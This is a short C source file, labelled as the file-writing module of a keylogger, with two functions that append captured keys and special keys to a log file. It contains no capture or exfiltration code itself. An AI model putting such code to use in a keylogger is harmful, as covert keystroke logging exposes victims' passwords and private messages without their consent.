// Basic file writing functions for the keylogger

#include "file.h"

// Write the captured key into a file
void WriteIntoFile(char data, const char* filePath) {

    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }
    char dataStr[2];
    sprintf(dataStr, "%c", data);
    fputs(dataStr, file);
    fflush(file);

    fclose(file);
}

// Write the captured special key into a file
void WriteSpecialKeyIntoFile(char *data, const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the special key into the file
    fputs(data, file);
    fflush(file);

    fclose(file);
}